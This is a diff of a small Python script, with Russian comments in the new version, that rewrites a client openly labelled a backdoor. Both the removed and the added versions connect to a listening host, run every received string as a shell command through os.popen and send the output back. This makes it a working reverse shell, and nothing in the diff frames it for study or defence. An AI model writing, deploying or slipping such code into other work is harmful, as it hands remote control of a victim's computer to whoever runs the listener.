@@ -1,52 +1,33 @@
-import os
 import socket
-import webbrowser as web
-from config import *
+import os
 
-def cmd_command(command):
-	output = os.popen(command).read()
-	return output
+def ExecuteCommand(command):
+        output = os.popen(command).read()
+        return output
 
 def main():
-	host = HOST
-	port = PORT
-
-#main cycle
-
-	while True:
-
-		while True:
-				#connection to server
-			try:
-				client = socket.socket()
-				client.connect(host, port)
-			except:
-				break
-
-		while True:
-				#backdoor
-			try:
-				data = client.recv(1024).decode()
-				if 'openweb' in str(data):
-					if 'https' in str(data):
-						udata = data.partition(' ')
-						url = udata[2]
-						web.open(str(url))
-
-					else:
-						cleint.send('error'.encode())
-
-				output = cmd_command(str(data))
-
-				if len(output) == 0:
-					client.send(' '.encode())
-				else:
-					client.send(output.encode())
-
-			except:
-				break
-
-	client.close()
+        host = "127.0.0.1" # ip который будем использовать
+        port = 6500 # порт
+        while True:
+            while True:
+                try:
+                    s = socket.socket() # создаем сокет
+                    s.connect((host,port))  # подключаемся
+                except:
+                    break
+    
+                while True:
+                    try:
+                        data = s.recv(1024).decode() # получаем команду
+                        output = ExecuteCommand(str(data))
+                        if len(output) == 0:
+                            s.send(" ".encode()) # в случае, если рзультат
+                            # пустой, отправляем пробел
+                        else:
+                            s.send(output.encode()) # отправляем результат
+                    except:
+                        break
+        s.close()
 
 if __name__ == '__main__':
-	main()
+    main()
